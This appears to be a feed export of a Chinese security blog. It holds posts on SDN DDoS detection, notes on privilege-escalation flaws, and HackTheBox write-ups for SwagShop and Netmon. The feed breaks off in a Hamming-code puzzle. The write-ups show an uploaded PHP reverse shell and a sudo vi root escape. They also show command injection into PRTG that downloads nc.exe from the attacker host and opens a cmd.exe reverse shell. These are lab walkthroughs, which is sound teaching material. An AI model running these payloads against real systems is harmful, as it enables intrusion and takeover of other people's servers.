id="DDOS检测"><a href="#DDOS检测" class="headerlink" title="DDOS检测"></a>DDOS检测</h1><h2 id="sFlow-RT"><a href="#sFlow-RT" class="headerlink" title="sFlow-RT"></a>sFlow-RT</h2><p>sFlow流量监控工具,可直观的展现网络中的流量以及其他监控信息。在SDN中有着很重要的作用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd sflow-rt</span><br><span class="line">$ ./start.sh</span><br></pre></td></tr></table></figure></p><p>监听6343，Web界面8008<br><img src="https://i.loli.net/2019/07/07/5d22074fbf06410070.png" alt="5.png"></p><h3 id="配置sFlow-Agent"><a href="#配置sFlow-Agent" class="headerlink" title="配置sFlow Agent"></a>配置sFlow Agent</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ovs-vsctl -- --id=@sflow create sflow agent=eth0 \</span><br><span class="line">&gt; target=\&quot;127.0.0.1:6343\&quot; sampling=10 polling=20 -- -- set bridge s1 \</span><br><span class="line">&gt; sflow=@sflow</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/07/08/5d22cb0a720bf21468.png" alt="6.png"></p><blockquote><p>agent：监控 eth0 网卡产生的流量；<br>target：sFlow-RT的IP，默认端口6343；<br>bridge：需要开启sFlow的网桥；<br>sampling：采样率，表示每隔N个Packet就取样一次<br>polling：轮询时间，每隔N秒polling一次</p></blockquote><p>注：有N个网桥，就要部署 sFlowAgent </p><h3 id="检验sFlow-Agent"><a href="#检验sFlow-Agent" class="headerlink" title="检验sFlow Agent"></a>检验sFlow Agent</h3><p><img src="https://i.loli.net/2019/07/09/5d246ba0d0fc449379.png" alt="7.png"><br>在Flows的<code>Name</code>、<code>Keys</code>、<code>Value</code>，分别键入<code>flows</code>，<code>ipsource、ipdestination、stack</code>,<code>bytes</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mininet&gt; xterm h1 h2</span><br></pre></td></tr></table></figure></p><p>在Agents中找到<code>flows</code><br><img src="https://i.loli.net/2019/07/09/5d247086043c471767.png" alt="8.png"></p><h2 id="DDOS模拟"><a href="#DDOS模拟" class="headerlink" title="DDOS模拟"></a>DDOS模拟</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mininet&gt; h2 ping -f h1</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/07/09/5d2472675ec1655184.png" alt="9.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ top</span><br></pre></td></tr></table></figure></p><p>CPU占有率飙升</p><h1 id="DDOS防御"><a href="#DDOS防御" class="headerlink" title="DDOS防御"></a>DDOS防御</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -X GET  http://127.0.0.1:8080/wm/staticflowentrypusher/json</span><br><span class="line">&#123;&#125; #为空</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ vim DDOS.json</span><br><span class="line">&#123;</span><br><span class="line">### Drop所有数据</span><br><span class="line">&quot;switch&quot;: &quot;00:00: 00:00:00:00:00:01&quot;, #交换机DPID</span><br><span class="line">&quot;name&quot;: &quot;flow-test&quot; , #随便的名字</span><br><span class="line">&quot;cookie&quot;:&quot;0&quot;, # 流表规则标识</span><br><span class="line">&quot;in_port&quot;: &quot;1&quot;, #入端口</span><br><span class="line">&quot;priority&quot;:&quot;100&quot;, #优先级</span><br><span class="line">&quot;active&quot;: &quot;true&quot;, #是否激活</span><br><span class="line">&quot;actions&quot;: &quot;output=no-forward&quot; #动作</span><br><span class="line">&#125;</span><br><span class="line">### Drop ICMP包</span><br><span class="line">&#123;</span><br><span class="line">&quot;switch&quot;: &quot;00:00: 00:00:00:00:00:01&quot;,</span><br><span class="line">&quot;name&quot;: &quot;flow-test&quot;,</span><br><span class="line">&quot;cookie&quot;:&quot;0&quot;,</span><br><span class="line">&quot;in_port&quot;: &quot;1&quot;,</span><br><span class="line">&quot;eth_type&quot;:&quot;0x0800&quot;, #以太网类型IPV4</span><br><span class="line">&quot;ip_proto&quot;:&quot;0x01&quot;, #ICMP协议</span><br><span class="line">&quot;priority&quot;:&quot;100&quot;,</span><br><span class="line">&quot;active&quot;: &quot;true&quot;,</span><br><span class="line">&quot;actions&quot;: &quot;output=no-forward&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ curl -X POST -d @ddos.json  http://127.0.0.1:8080/wm/staticflowentrypusher/json #上传流表</span><br><span class="line">----------------------------------------------------</span><br><span class="line">$ curl -X DELETE -d&apos;&#123;&quot;name&quot;:&quot;flow-test&quot;&#125;&apos; \</span><br><span class="line">&gt; http://localhost:8080/wm/staticflowentrypusher/json #删除流表</span><br></pre></td></tr></table></figure><p>使用API提交</p><h3 id="实际情况更为复杂"><a href="#实际情况更为复杂" class="headerlink" title="实际情况更为复杂"></a>实际情况更为复杂</h3><h1 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h1><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;本实验是基于SDN的DDoS检查与防御&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Ubuntu&lt;/li&gt;
&lt;li&gt;sFlow-R&lt;/li&gt;
&lt;li&gt;Mininet&lt;/li&gt;
&lt;li&gt;Floodlight (注意版本和jdk的问题)&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;其他问题不大&lt;br&gt;
    
    </summary>
    
      <category term="信息安全" scheme="http://www.lanbainan.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="安防" scheme="http://www.lanbainan.cn/tags/%E5%AE%89%E9%98%B2/"/>
    
      <category term="DDOS" scheme="http://www.lanbainan.cn/tags/DDOS/"/>
    
  </entry>
  
  <entry>
    <title>越权小测试</title>
    <link href="http://www.lanbainan.cn/2019/07/04/2019-07-04/"/>
    <id>http://www.lanbainan.cn/2019/07/04/2019-07-04/</id>
    <published>2019-07-04T08:44:00.000Z</published>
    <updated>2019-07-04T10:39:07.178Z</updated>
    
    <content type="html"><![CDATA[<h1 id="这是一个小实验"><a href="#这是一个小实验" class="headerlink" title="这是一个小实验"></a>这是一个小实验</h1><h2 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h2><p>A和B 具有相同权限，但是A可以通过攻击手段访问B的个人资料<br><a id="more"></a></p><blockquote><p><strong>基于用户身份ID</strong> </p><ul><li>在使用某个功能时通过用户提交的身份ID（用户ID、账号、手机号、证件号等用户唯一标识）来访问或操作对应的数据。</li></ul></blockquote><hr><blockquote><p><strong>基于对象ID</strong> </p><ul><li>在使用某个功能时通过用户提交的对象ID（如订单号、记录号）来访问或操作对应的数据。</li></ul></blockquote><hr><blockquote><p><strong>基于文件名</strong></p><ul><li>在使用某个功能时通过文件名直接访问文件，最常见于用户上传文件的场景。</li></ul></blockquote><h2 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h2><p>A普通权限和B管理员权限两个具有不同权限，A通过攻击获取B权限（管理员与user用户必须为同一个表(除非连续查询连个语句)）</p><blockquote><p><strong>未认证账户访问无需认证后能访问该功能</strong></p><ul><li>仅使用js跳转来限制未授权的用户访问(禁用js即可访问后台)</li></ul></blockquote><hr><blockquote><p><strong>不具备某个功能权限的账户认证后成功访问该功能</strong><br>提权骚操作</p></blockquote><hr><blockquote><p><strong>权限框架缺陷</strong></p><ul><li>权限控制框架是实现权限控制功能的基础，如果权限控制框架本身存在缺陷容易被攻陷会导致权限控制功能完全失效。在cookie中使用简单的权限标识来标记用户的权限等级或使用用户请求参数中所带的简单用户ID来控制用户权限，是典型的权限框架缺陷。</li></ul></blockquote><p>引用<a href="https://blog.csdn.net/Fly_hps/article/details/87088690" target="_blank" rel="noopener">@FLy_鹏程万里–业务逻辑漏洞探索之越权漏洞</a></p><h2 id="平行越权实验"><a href="#平行越权实验" class="headerlink" title="平行越权实验"></a>平行越权实验</h2><p>本账号基本信息<br><img src="https://i.loli.net/2019/07/04/5d1dc20c799de85326.png" alt="2.png"><br>修改userid将的到下一用户的资料<br><img src="https://i.loli.net/2019/07/04/5d1dbf4b2ddf192950.png" alt="1.png"><br><img src="https://i.loli.net/2019/07/04/5d1dc2cfe9b6d99362.png" alt="3.png"></p><p>平行越权一般只具有删改查权限</p><h2 id="垂直越权实验"><a href="#垂直越权实验" class="headerlink" title="垂直越权实验"></a>垂直越权实验</h2><p>这个天天都在做</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>平行漏洞挖掘<br><img src="https://i.loli.net/2019/07/04/5d1dd3358e2b268921.png" alt="4.png"><br>垂直越权挖掘<br><img src="https://i.loli.net/2019/07/04/5d1dd6a28bb7552736.png" alt="5.png"></p><h1 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h1><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;这是一个小实验&quot;&gt;&lt;a href=&quot;#这是一个小实验&quot; class=&quot;headerlink&quot; title=&quot;这是一个小实验&quot;&gt;&lt;/a&gt;这是一个小实验&lt;/h1&gt;&lt;h2 id=&quot;水平越权&quot;&gt;&lt;a href=&quot;#水平越权&quot; class=&quot;headerlink&quot; title=&quot;水平越权&quot;&gt;&lt;/a&gt;水平越权&lt;/h2&gt;&lt;p&gt;A和B 具有相同权限，但是A可以通过攻击手段访问B的个人资料&lt;br&gt;
    
    </summary>
    
      <category term="信息安全" scheme="http://www.lanbainan.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="安全测试" scheme="http://www.lanbainan.cn/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>对SwagShop的测试</title>
    <link href="http://www.lanbainan.cn/2019/07/03/2019-07-03/"/>
    <id>http://www.lanbainan.cn/2019/07/03/2019-07-03/</id>
    <published>2019-07-03T01:18:00.000Z</published>
    <updated>2019-07-03T10:03:38.728Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SwagShop"><a href="#SwagShop" class="headerlink" title="SwagShop"></a>SwagShop</h1><p>靶机：10.10.10.140<br>kali：10.10.15.83<br>实验目的：找到flag<br>项目地址：<a href="https://www.hackthebox.eu/home/machines/profile/188" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/profile/188</a><br><a id="more"></a></p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# masscan -p 0-65535 192.168.67.135 --rate 1000</span><br></pre></td></tr></table></figure><p>开放<code>22</code>,<code>80</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -T4 -A -v -p22,80 10.10.10.140</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)</span><br><span class="line">|_  256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 88733EE53676A47FC354A61C32516E82</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Home page</span><br></pre></td></tr></table></figure></p><p>80端口开放服务，百度可知<br>Magento是一套专业开源的电子商务系统<br><img src="https://i.loli.net/2019/07/03/5d1c14b74479798854.png" alt="1.png"></p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# searchsploit Magento</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/07/03/5d1c179fa46ae95785.png" alt="2.png"><br>令人注意的是由一个远程代码执行,将一些注释和代码修改一下<br><img src="https://i.loli.net/2019/07/03/5d1c1b77be59d67880.png" alt="3.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# python 37977.py</span><br><span class="line">WORKED</span><br><span class="line">Check http://10.10.10.140/admin with creds forme:forme</span><br></pre></td></tr></table></figure></p><p>得到账户密码<code>forme:forme</code><br>后台登录<code>http://10.10.10.140/index.php/admin</code><br>安装<a href="https://github.com/lavalamp-/LavaMagentoBD" target="_blank" rel="noopener">扩展shell</a>,<code>System&gt;Magento Connect&gt;Magento Connect Manager</code>,将<code>app\code\community\Lavalamp\Connector\controllers\IndexController.php</code>内容替换为<code>/usr/share/webshells/php/php-reverse-shell.php</code>并修改IP和端口，重新打包为<code>.tgz</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -czvf bd.tgz app package.xml skin</span><br></pre></td></tr></table></figure></p><p>安装扩展,打开页面<code>http://10.10.10.140/app/code/community/Lavalamp/Connector/controllers/IndexController.php</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">λ nc -nvlp 4444</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -l</span><br><span class="line">Matching Defaults entries for www-data on swagshop:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on swagshop:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/vi /var/www/html/*</span><br></pre></td></tr></table></figure><p>发现无需密码登录root<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www/html/</span><br><span class="line">echo &quot;test&quot; &gt; test</span><br><span class="line">sudo /usr/bin/vi /var/www/html/test -c &apos;!sh&apos;</span><br><span class="line">cat /root/root.txt</span><br><span class="line">c2b087d66e14a652a3b86a130ac56721</span><br><span class="line"></span><br><span class="line">   ___ ___</span><br><span class="line"> /| |/|\| |\</span><br><span class="line">/_| 麓 |.` |_\           We are open! (Almost)</span><br><span class="line">  |   |.  |</span><br><span class="line">  |   |.  |         Join the beta HTB Swag Store!</span><br><span class="line">  |___|.__|       https://hackthebox.store/password</span><br><span class="line"></span><br><span class="line">                   PS: Use root flag as password!</span><br></pre></td></tr></table></figure></p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>在解包打包时，没有查看官方文档，浪费了一定时间，不会就查文档，切记!切记!</p><h1 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h1><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;SwagShop&quot;&gt;&lt;a href=&quot;#SwagShop&quot; class=&quot;headerlink&quot; title=&quot;SwagShop&quot;&gt;&lt;/a&gt;SwagShop&lt;/h1&gt;&lt;p&gt;靶机：10.10.10.140&lt;br&gt;kali：10.10.15.83&lt;br&gt;实验目的：找到flag&lt;br&gt;项目地址：&lt;a href=&quot;https://www.hackthebox.eu/home/machines/profile/188&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.hackthebox.eu/home/machines/profile/188&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="信息安全" scheme="http://www.lanbainan.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="安全测试" scheme="http://www.lanbainan.cn/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    
      <category term="靶机实验" scheme="http://www.lanbainan.cn/tags/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>对HTB Netmon的测试</title>
    <link href="http://www.lanbainan.cn/2019/06/21/2019-06-21/"/>
    <id>http://www.lanbainan.cn/2019/06/21/2019-06-21/</id>
    <published>2019-06-21T14:49:00.000Z</published>
    <updated>2019-06-24T13:17:06.929Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Netmon"><a href="#Netmon" class="headerlink" title="Netmon"></a>Netmon</h1><p>靶机：10.10.10.152<br>kali：10.10.15.83<br>一次有趣的实验<br>实验目的：找到flag<br><a id="more"></a><br>项目地址：<a href="https://www.hackthebox.eu/home/machines/profile/177" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/profile/177</a></p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>nmap启动<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p- 10.10.10.152</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">21/tcp    open  ftp          Microsoft ftpd</span><br><span class="line">80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds</span><br><span class="line">5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">49664/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49665/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49666/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49680/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49681/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49691/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">51061/tcp open  tcpwrapped</span><br></pre></td></tr></table></figure></p><p>访问80，运行PRTG Network Monitor (NETMON)暂时不知道怎么用</p><p><img src="https://i.loli.net/2019/06/19/5d0a37cf9955f31844.png" alt="1.png"></p><p>访问21，有料<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# ftp 10.10.10.152</span><br><span class="line">Connected to 10.10.10.152.</span><br><span class="line">220 Microsoft FTP Service</span><br><span class="line">Name (10.10.10.152:root): anonymous</span><br><span class="line">331 Anonymous access allowed, send identity (e-mail name) as password.</span><br><span class="line">Password:</span><br><span class="line">230 User logged in.</span><br><span class="line">Remote system type is Windows_NT.</span><br><span class="line">ftp&gt;ls -al</span><br><span class="line">200 PORT command successful.</span><br><span class="line">125 Data connection already open; Transfer starting.</span><br><span class="line">11-20-16  10:46PM       &lt;DIR&gt;          $RECYCLE.BIN</span><br><span class="line">02-03-19  12:18AM                 1024 .rnd</span><br><span class="line">11-20-16  09:59PM               389408 bootmgr</span><br><span class="line">07-16-16  09:10AM                    1 BOOTNXT</span><br><span class="line">02-03-19  08:05AM       &lt;DIR&gt;          Documents and Settings</span><br><span class="line">02-25-19  10:15PM       &lt;DIR&gt;          inetpub</span><br><span class="line">06-20-19  08:12AM                  538 output.txt</span><br><span class="line">06-20-19  07:32AM            738197504 pagefile.sys</span><br><span class="line">07-16-16  09:18AM       &lt;DIR&gt;          PerfLogs</span><br><span class="line">02-25-19  10:56PM       &lt;DIR&gt;          Program Files</span><br><span class="line">02-03-19  12:28AM       &lt;DIR&gt;          Program Files (x86)</span><br><span class="line">02-25-19  10:56PM       &lt;DIR&gt;          ProgramData</span><br><span class="line">02-03-19  08:05AM       &lt;DIR&gt;          Recovery</span><br><span class="line">06-20-19  08:14AM                   70 root.txt</span><br><span class="line">02-03-19  08:04AM       &lt;DIR&gt;          System Volume Information</span><br><span class="line">02-03-19  08:08AM       &lt;DIR&gt;          Users</span><br><span class="line">02-25-19  11:49PM       &lt;DIR&gt;          Windows</span><br><span class="line">226 Transfer complete.</span><br></pre></td></tr></table></figure></p><p>发现<code>output.txt</code>,找到flag位置</p><p><img src="https://i.loli.net/2019/06/24/5d10ad1460d2b78263.png" alt="3.png"></p><p>在<code>/Users/Public</code>目录发现<code>user.txt</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; get user.txt</span><br><span class="line">λ cat user.txt</span><br><span class="line">dd58ce67b49e15105e88096c8d9255a5</span><br></pre></td></tr></table></figure></p><p>下载PRTG配置文件<code>ProgramData/Paessler/PRTG Network Monitor</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PRTG Configuration.old</span><br><span class="line">PRTG Configuration.old.bak</span><br><span class="line">PRTG Graph Data Cache.dat</span><br></pre></td></tr></table></figure></p><p>在<code>PRTG Configuration.old.bak</code>文件中找到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">     &lt;/dbcredentials&gt;</span><br><span class="line">     &lt;dbpassword&gt;</span><br><span class="line">&lt;!-- User: prtgadmin --&gt;</span><br><span class="line">PrTg@dmin2018</span><br><span class="line">     &lt;/dbpassword&gt;</span><br><span class="line">     &lt;dbtimeout&gt;</span><br></pre></td></tr></table></figure></p><p>Username:prtgadmin<br>Password:PrTg@dmin2018<br>结果登录不起<br>多番尝试将2018改为2019,即可<br>根据网站服务发现远程代码执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# searchsploit PRTG</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/06/24/5d10ad867b0a085358.png" alt="4.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.152/editnotification.htm?id=301&amp;tabid=1</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/06/24/5d10c7f1378c277690.png" alt="5.png"></p><p>上传nc（添加加了半天用户加不起）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">test.txt; powershell -c&quot;(new-object System.Net.WebClient).DownloadFile(&apos;http://10.10.15.71:80/nc.exe&apos;,&apos;C:\nc.exe&apos;)&quot;</span><br><span class="line">test.txt;C:\nc.exe 10.10.15.71 8888 -e cmd.exe</span><br><span class="line">λ nc -nvlp 8888</span><br><span class="line">C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/06/24/5d10cabb4064731759.png" alt="6.png"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>密码更新，漏洞查找<br>注：记住密码好坑！好坑！好坑！</p><h1 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h1><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Netmon&quot;&gt;&lt;a href=&quot;#Netmon&quot; class=&quot;headerlink&quot; title=&quot;Netmon&quot;&gt;&lt;/a&gt;Netmon&lt;/h1&gt;&lt;p&gt;靶机：10.10.10.152&lt;br&gt;kali：10.10.15.83&lt;br&gt;一次有趣的实验&lt;br&gt;实验目的：找到flag&lt;br&gt;
    
    </summary>
    
      <category term="信息安全" scheme="http://www.lanbainan.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="安全测试" scheme="http://www.lanbainan.cn/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    
      <category term="靶机实验" scheme="http://www.lanbainan.cn/tags/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>鸡藕椒盐味浅析</title>
    <link href="http://www.lanbainan.cn/2019/06/16/2019-06-16/"/>
    <id>http://www.lanbainan.cn/2019/06/16/2019-06-16/</id>
    <published>2019-06-16T01:12:00.000Z</published>
    <updated>2019-06-20T07:05:00.345Z</updated>
    
    <content type="html"><![CDATA[<p>#题目：<br>公司食堂最新出了一种小吃，叫鸡藕椒盐味汉堡，售价八块钱，为了促销，上面有一个验证码，输入后可以再换取一个汉堡。但是问题是每个验证码几乎都有错误,而且打印的时候倒了一下。小明买到了一个汉堡，准备还原验证码，因为一个吃不饱啊~~<a id="more"></a>验证码如下：1100 1010 0000 。把答案哈希一下就可以提交了。(答案为正确值(不包括数字之间的空格)的32位md5值的小写形式)<br><!--more--></p><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>仔细阅读</p><ul><li><a href="https://www.cnblogs.com/dushikang/p/8334776.html" target="_blank" rel="noopener">奇偶校验位</a></li><li><a href="https://blog.csdn.net/blue_starry_sky/article/details/53997548" target="_blank" rel="noopener">汉明码原理</a></li></ul><p>公式：2^k≥n+k+1</p><h2 id="0x01-校验位"><a href="#0x01-校验位" class="headerlink" title="0x01 校验位"></a>0x01 校验位</h2><table><thead><tr><th style="text-align:center"><strong>编号</strong></th><th style="text-align:center">1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>……</th></tr></thead><tbody><tr><td style="text-align:center"><strong>二进制</strong></td><td 